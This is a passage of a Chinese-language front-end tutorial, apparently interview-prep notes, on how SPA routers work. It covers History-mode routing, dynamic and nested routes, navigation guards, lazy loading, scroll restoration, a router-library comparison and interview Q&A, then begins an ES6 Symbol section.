class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">tagName</span> === <span class="hljs-string">&#x27;A&#x27;</span>) &#123;<br>        e.<span class="hljs-title function_">preventDefault</span>();<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">navigate</span>(e.<span class="hljs-property">target</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;href&#x27;</span>));<br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 监听浏览器前进/后退</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;popstate&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>());<br>    <br>    <span class="hljs-comment">// 初始加载</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>());<br>  &#125;<br>  <br>  <span class="hljs-title function_">addRoute</span>(<span class="hljs-params">path, callback</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[path] = callback;<br>  &#125;<br>  <br>  <span class="hljs-title function_">handleRouting</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> currentPath = location.<span class="hljs-property">pathname</span>;<br>    <span class="hljs-keyword">const</span> routeHandler = <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[currentPath] || <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[<span class="hljs-string">&#x27;*&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (routeHandler) &#123;<br>      <span class="hljs-title function_">routeHandler</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/404&#x27;</span>);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">navigate</span>(<span class="hljs-params">path</span>) &#123;<br>    history.<span class="hljs-title function_">pushState</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, path);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">replace</span>(<span class="hljs-params">path</span>) &#123;<br>    history.<span class="hljs-title function_">replaceState</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, path);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>优缺点对比</strong></p><table><thead><tr><th align="left">优点</th><th align="left">缺点</th></tr></thead><tbody><tr><td align="left">✅ 干净的URL</td><td align="left">❌ 需要服务器端支持</td></tr><tr><td align="left">✅ 完整的路径控制</td><td align="left">❌ 兼容性要求（IE10+）</td></tr><tr><td align="left">✅ 支持复杂参数传递</td><td align="left">❌ 实现复杂度更高</td></tr></tbody></table><h2 id="高级路由功能实现"><a href="#高级路由功能实现" class="headerlink" title="高级路由功能实现"></a>高级路由功能实现</h2><p><strong>动态路由匹配</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由配置</span><br><span class="hljs-keyword">const</span> routes = &#123;<br>  <span class="hljs-string">&#x27;/user/:id&#x27;</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> <span class="hljs-title function_">showUserProfile</span>(params.<span class="hljs-property">id</span>),<br>  <span class="hljs-string">&#x27;/product/:category/:id&#x27;</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> <span class="hljs-title function_">showProduct</span>(params.<span class="hljs-property">category</span>, params.<span class="hljs-property">id</span>)<br>&#125;;<br><br><span class="hljs-comment">// 匹配函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">matchRoute</span>(<span class="hljs-params">path</span>) &#123;<br>  <span class="hljs-keyword">const</span> routeKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(routes);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> route <span class="hljs-keyword">of</span> routeKeys) &#123;<br>    <span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<br>      <span class="hljs-string">`^<span class="hljs-subst">$&#123;route.replace(/:\w+/g, <span class="hljs-string">&#x27;([^/]+)&#x27;</span>)&#125;</span>$`</span><br>    );<br>    <br>    <span class="hljs-keyword">const</span> match = path.<span class="hljs-title function_">match</span>(regex);<br>    <span class="hljs-keyword">if</span> (match) &#123;<br>      <span class="hljs-keyword">const</span> params = &#123;&#125;;<br>      <span class="hljs-keyword">const</span> paramNames = [...route.<span class="hljs-title function_">matchAll</span>(<span class="hljs-regexp">/:(\w+)/g</span>)].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m[<span class="hljs-number">1</span>]);<br>      <br>      paramNames.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">name, i</span>) =&gt;</span> &#123;<br>        params[name] = match[i + <span class="hljs-number">1</span>];<br>      &#125;);<br>      <br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">handler</span>: routes[route],<br>        params<br>      &#125;;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>嵌套路由实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由配置</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-title class_">DashboardLayout</span>,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/overview&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Overview</span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/settings&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Settings</span> &#125;<br>    ]<br>  &#125;<br>];<br><br><span class="hljs-comment">// 路由渲染组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">RouterView</span>(<span class="hljs-params">&#123; routes &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> currentPath = <span class="hljs-title function_">useCurrentPath</span>();<br>  <span class="hljs-keyword">const</span> matchedRoute = <span class="hljs-title function_">findNestedRoute</span>(routes, currentPath);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">matchedRoute.component</span>&gt;</span></span><br><span class="language-xml">      &#123;matchedRoute.children &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">RouterView</span> <span class="hljs-attr">routes</span>=<span class="hljs-string">&#123;matchedRoute.children&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">matchedRoute.component</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>路由守卫（导航守卫）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedRouter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HistoryRouter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>();<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span> = [];<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">afterHooks</span> = [];<br>  &#125;<br>  <br>  <span class="hljs-title function_">beforeEach</span>(<span class="hljs-params">guard</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span>.<span class="hljs-title function_">push</span>(guard);<br>  &#125;<br>  <br>  <span class="hljs-title function_">afterEach</span>(<span class="hljs-params">hook</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">afterHooks</span>.<span class="hljs-title function_">push</span>(hook);<br>  &#125;<br>  <br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">navigate</span>(<span class="hljs-params">to</span>) &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">from</span> = location.<span class="hljs-property">pathname</span>;<br>    <br>    <span class="hljs-comment">// 执行前置守卫</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> guard <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span>) &#123;<br>      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">guard</span>(to, <span class="hljs-keyword">from</span>);<br>      <span class="hljs-keyword">if</span> (result === <span class="hljs-literal">false</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 取消导航</span><br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 执行导航</span><br>    history.<span class="hljs-title function_">pushState</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, to);<br>    <br>    <span class="hljs-comment">// 更新视图</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>();<br>    <br>    <span class="hljs-comment">// 执行后置钩子</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">afterHooks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">hook</span> =&gt;</span> <span class="hljs-title function_">hook</span>(to, <span class="hljs-keyword">from</span>));<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br>router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (to === <span class="hljs-string">&#x27;/admin&#x27;</span> &amp;&amp; !<span class="hljs-title function_">isAdmin</span>()) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;/login&#x27;</span>; <span class="hljs-comment">// 重定向</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="路由性能优化策略"><a href="#路由性能优化策略" class="headerlink" title="路由性能优化策略"></a>路由性能优化策略</h2><p><strong>路由懒加载</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> routes = &#123;<br>  <span class="hljs-string">&#x27;/dashboard&#x27;</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Dashboard.js&#x27;</span>),<br>  <span class="hljs-string">&#x27;/admin&#x27;</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AdminPanel.js&#x27;</span>)<br>&#125;;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRouting</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> path = location.<span class="hljs-property">pathname</span>;<br>  <span class="hljs-keyword">const</span> loader = routes[path];<br>  <br>  <span class="hljs-keyword">if</span> (loader) &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loader</span>();<br>    <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">render</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>路由预加载</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 鼠标悬停时预加载</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;a&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">link</span> =&gt;</span> &#123;<br>  link.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;mouseenter&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> path = link.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;href&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (routes[path]) &#123;<br>      routes[path]().<span class="hljs-title function_">preload</span>();<br>    &#125;<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>滚动行为管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;popstate&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 从历史记录恢复滚动位置</span><br>  <span class="hljs-keyword">const</span> scrollPos = history.<span class="hljs-property">state</span>?.<span class="hljs-property">scrollPosition</span> || [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>];<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(...scrollPos);<br>&#125;);<br><br>router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 记录滚动位置</span><br>  history.<span class="hljs-title function_">replaceState</span>(<br>    &#123; ...history.<span class="hljs-property">state</span>, <span class="hljs-attr">scrollPosition</span>: [<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollX</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span>] &#125;,<br>    <span class="hljs-string">&#x27;&#x27;</span>,<br>    to<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="路由库实现对比"><a href="#路由库实现对比" class="headerlink" title="路由库实现对比"></a>路由库实现对比</h2><table><thead><tr><th align="left">特性</th><th align="left">原生实现</th><th align="left">React Router</th><th align="left">Vue Router</th></tr></thead><tbody><tr><td align="left">路由模式</td><td align="left">手动实现</td><td align="left">支持hash&#x2F;history</td><td align="left">支持hash&#x2F;history&#x2F;abstract</td></tr><tr><td align="left">嵌套路由</td><td align="left">需手动实现</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">路由守卫</td><td align="left">需手动实现</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">动态路由</td><td align="left">需手动实现</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">懒加载</td><td align="left">需手动实现</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">滚动行为</td><td align="left">需手动实现</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">TypeScript</td><td align="left">需手动配置</td><td align="left">✅</td><td align="left">✅</td></tr></tbody></table><h2 id="面试常见问题分析"><a href="#面试常见问题分析" class="headerlink" title="面试常见问题分析"></a>面试常见问题分析</h2><p><strong>Q：Hash模式和History模式如何选择？</strong></p><ul><li>优先选择History模式（更友好的URL、更好的SEO支持）</li><li>需要兼容IE9或以下时使用Hash模式</li><li>无后端控制权时使用Hash模式（如静态托管）</li></ul><p><strong>Q：为什么History模式需要服务器配置？</strong></p><p>当用户直接访问&#x2F;dashboard等子路径时，服务器需要返回单页应用的入口文件（index.html），而不是尝试查找不存在的&#x2F;dashboard.html文件。</p><p><strong>Q：如何解决路由参数变化组件不刷新的问题？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Router 示例</span><br>&lt;<span class="hljs-title class_">Route</span> <br>  path=<span class="hljs-string">&quot;/user/:id&quot;</span> <br>  component=&#123;<span class="hljs-title class_">User</span>&#125; <br>  key=&#123;location.<span class="hljs-property">pathname</span>&#125; <span class="hljs-comment">// 强制重新挂载</span><br>/&gt;<br><br><span class="hljs-comment">// 或监听参数变化</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 当id变化时重新获取数据</span><br>  <span class="hljs-title function_">fetchUserData</span>(params.<span class="hljs-property">id</span>);<br>&#125;, [params.<span class="hljs-property">id</span>]);<br></code></pre></td></tr></table></figure><p><strong>Q：如何实现路由过渡动画？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Vue</span><br>&lt;template&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fade&quot;</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&quot;out-in&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span></span><br>&lt;/template&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-selector-class">.fade-enter-active</span>, <span class="hljs-selector-class">.fade-leave-active</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span>;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-selector-class">.fade-enter</span>, <span class="hljs-selector-class">.fade-leave-to</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// React</span><br><span class="hljs-comment">// src/components/RouteTransition.jsx</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">CSSTransition</span>, <span class="hljs-title class_">TransitionGroup</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-transition-group&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; useLocation, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteTransition</span> = (<span class="hljs-params">&#123; children &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TransitionGroup</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">CSSTransition</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;location.key&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">timeout</span>=<span class="hljs-string">&#123;300&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">classNames</span>=<span class="hljs-string">&quot;fade&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&#123;location&#125;</span>&gt;</span></span><br><span class="language-xml">          &#123;children&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">CSSTransition</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">TransitionGroup</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RouteTransition</span>;<br><br><span class="hljs-comment">// src/App.jsx</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">RouteTransition</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/RouteTransition&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./pages/Home&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./pages/About&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">RouteTransition</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">About</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">RouteTransition</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>前端路由是现代SPA应用的核心基础设施，理解其原理需要掌握：</p><ul><li>两种路由模式的底层实现机制</li><li>History API 的详细用法</li><li>动态路由匹配算法</li><li>路由生命周期管理（导航守卫）</li><li>性能优化策略（懒加载、预加载）</li><li>最佳实践选择（模式选择、参数处理）</li></ul><p>在面试中回答路由问题时，建议结合具体场景：</p><ul><li>解释核心原理时使用技术术语（popstate&#x2F;hashchange）</li><li>对比不同实现方案时说明取舍原因</li><li>解决实际问题时展示优化意识</li><li>提到主流路由库时分析其设计哲学</li></ul><h1 id="ES6-Symbol"><a href="#ES6-Symbol" class="headerlink" title="ES6+ Symbol"></a>ES6+ Symbol</h1><h2 id="定义与描述"><a href="#定义与描述" class="headerlink" title="定义与描述"></a>定义与描述</h2><p>Symbol 是 ES6 新引入的一种原始数据类型，表示独一无二的值，Symbol 的主要用途是创建唯一标识符，用于对象属性的键，以避免属性名冲突。</p><h2 id="创建与使用"><a href="#创建与使用" class="headerlink" title="创建与使用"></a>创建与使用</h2><p><strong>基础创建</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 无描述创建</span><br><span class="hljs-keyword">const</span> sym1 = <span class="hljs-title class_">Symbol</span>();<br><br><span class="hljs-comment">// 带描述创建（仅用于调试）</span><br><span class="hljs-keyword">const</span> sym2 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;description&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sym2.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// &quot;Symbol(description)&quot;</span><br></code></pre></td></tr></table></figure><p><strong>全局注册表</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建或获取全局 Symbol</span><br><span class="hljs-keyword">const</span> globalSym = <span class="hljs-title class_">Symbol</span>.<span class="hljs-title 